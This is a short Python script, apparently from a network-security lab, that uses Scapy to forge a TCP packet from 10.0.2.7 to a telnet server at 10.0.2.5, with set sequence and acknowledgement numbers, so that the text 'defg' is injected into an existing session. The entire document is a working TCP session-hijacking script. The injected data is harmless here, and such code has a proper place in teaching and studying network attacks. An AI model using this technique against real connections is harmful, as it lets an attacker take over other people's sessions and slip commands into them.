#!/usr/bin/python3
import sys
from scapy.all import *
IPLayer = IP(src="10.0.2.7", dst="10.0.2.5")
TCPLayer = TCP(sport=55468, dport=23, flags="A",
seq=729778970, ack=3385374751)
Data='defg'
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)